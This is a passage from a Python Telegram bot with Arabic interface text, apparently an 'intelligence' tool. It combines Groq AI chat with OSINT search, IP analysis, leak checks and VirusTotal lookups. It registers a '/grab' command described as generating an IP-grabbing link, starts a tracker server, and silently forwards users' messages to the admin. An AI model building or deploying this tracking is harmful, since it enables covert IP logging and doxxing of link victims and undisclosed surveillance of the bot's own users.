            await query.edit_message_text("🔎 أرسل النطاق (Domain) لفحص الـ Whois:", reply_markup=back_kb)
            return
        elif data == "cb_leakcheck":
            pending_states[user.id] = "leakcheck"
            await query.edit_message_text("🔍 أرسل البريد أو الرقم لفحص التسريبات:", reply_markup=back_kb)
            return
        
        await query.edit_message_text(response, parse_mode="Markdown", reply_markup=back_kb)


def is_code_block(text: str) -> bool:
    return "```" in text or text.strip().startswith("def ") or text.strip().startswith("class ")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_msg = update.message.text or ""

    register_user(user)

    state = pending_states.get(user.id)

    if state == "ai":
        if user.id != ADMIN_ID:
            notify_control(user, f"سؤال AI: {user_msg[:50]}")
        typing_msg = await update.message.reply_text("⏳ جاري المعالجة...")
        reply = ask_groq(user.id, user_msg, use_internet=True)
        await typing_msg.delete()
        await update.message.reply_text(reply, parse_mode="Markdown")
        return

    if state == "code":
        if user.id != ADMIN_ID:
            notify_control(user, f"تحليل كود: {user_msg[:50]}")
        typing_msg = await update.message.reply_text("💻 جاري تحليل الكود...")
        result = analyze_code(user_msg)
        await typing_msg.edit_text(result, parse_mode="Markdown")
        return

    if state == "osint":
        if user.id != ADMIN_ID:
            notify_control(user, f"بحث OSINT: {user_msg[:50]}")
        typing_msg = await update.message.reply_text("🔍 جاري البحث...")
        result = cmd_osint_search(user_msg.strip())
        await typing_msg.edit_text(result, parse_mode="Markdown", disable_web_page_preview=True)
        pending_states.pop(user.id, None)
        return

    if state == "ip_state":
        typing_msg = await update.message.reply_text("🌐 جاري تحليل الـ IP...")
        result = analyze_ip(user_msg.strip())
        await typing_msg.edit_text(result, parse_mode="Markdown")
        pending_states.pop(user.id, None)
        return

    if state == "leakcheck":
        context.args = [user_msg]
        await cmd_leakcheck(update, context)
        pending_states.pop(user.id, None)
        return

    if state == "vt":
        context.args = [user_msg]
        await cmd_vt(update, context)
        pending_states.pop(user.id, None)
        return

    if user.id != ADMIN_ID:
        notify_control(user, f"رسالة: {user_msg[:80]}")

    typing_msg = await update.message.reply_text("⏳ جاري المعالجة...")

    if is_code_block(user_msg):
        reply = analyze_code(user_msg)
    else:
        reply = ask_groq(user.id, user_msg, use_internet=True)

    await typing_msg.delete()
    await update.message.reply_text(reply, parse_mode="Markdown")


async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user    = update.effective_user
    caption = update.message.caption or "صف ما تراه في الصورة بالتفصيل"
    msg     = await update.message.reply_text("🖼️ جاري تحليل الصورة...")
    photo   = update.message.photo[-1]
    file    = await context.bot.get_file(photo.file_id)
    img_bytes = bytes(await file.download_as_bytearray())
    result  = analyze_image_groq(img_bytes, caption)
    await msg.edit_text(result, parse_mode="Markdown")
    if user.id != ADMIN_ID:
        notify_control(user, "أرسل صورة للتحليل")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🚀  تشغيل البوت
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def register_bot_commands():
    """تحديث قائمة أوامر البوت في Telegram (زر القائمة)."""
    commands = [
        {"command": "start",      "description": "تشغيل النظام"},
        {"command": "osint",      "description": "بحث OSINT على الإنترنت"},
        {"command": "grab",       "description": "توليد رابط سحب IP"},
        {"command": "mylogs",     "description": "عرض سجلات روابطك"},
        {"command": "leakcheck",  "description": "فحص التسريبات"},
        {"command": "clear",      "description": "مسح ذاكرة المحادثة"},
        {"command": "support",    "description": "الدعم والتواصل"},
        {"command": "help",       "description": "قائمة الأوامر"},
    ]
    try:
        resp = requests.post(
            f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/setMyCommands",
            json={"commands": commands},
            timeout=10,
        )
        if resp.ok:
            print("✅ قائمة الأوامر حُدِّثت في Telegram")
        else:
            print(f"⚠️ فشل تحديث قائمة الأوامر: {resp.text}")
    except Exception as e:
        print(f"⚠️ خطأ في setMyCommands: {e}")


def main():
    # تشغيل خادم التعقب في خيط منفصل
    tracker_thread = threading.Thread(target=start_tracker_server, daemon=False)
    tracker_thread.start()
    print("📡 خادم التعقب يعمل في خيط منفصل...")
    
    # تشغيل البوت الرئيسي
    app = Application.builder().token(MAIN_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",    cmd_start))
    app.add_handler(CommandHandler("help",     cmd_help))
    app.add_handler(CommandHandler("grab",     cmd_grab))
    app.add_handler(CommandHandler("mylogs",   cmd_mylogs))
    app.add_handler(CommandHandler("clear",    cmd_clear))
    app.add_handler(CommandHandler("support",  cmd_support))
    app.add_handler(CommandHandler("leakcheck", cmd_leakcheck))
    app.add_handler(CommandHandler("vt",       cmd_vt))
    app.add_handler(CommandHandler("stats",    cmd_stats))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    register_bot_commands()
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"⚡ راشد الاستخباراتي v2.0 — يعمل الآن")
    print(f"🤖 البوت: {MAIN_BOT_TOKEN.split(':')[0]}")
    print(f"🌐 الخادم: {BOT_SERVER_URL}")
    print(f"👥 المستخدمون المسجّلون: {get_users_count()}")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
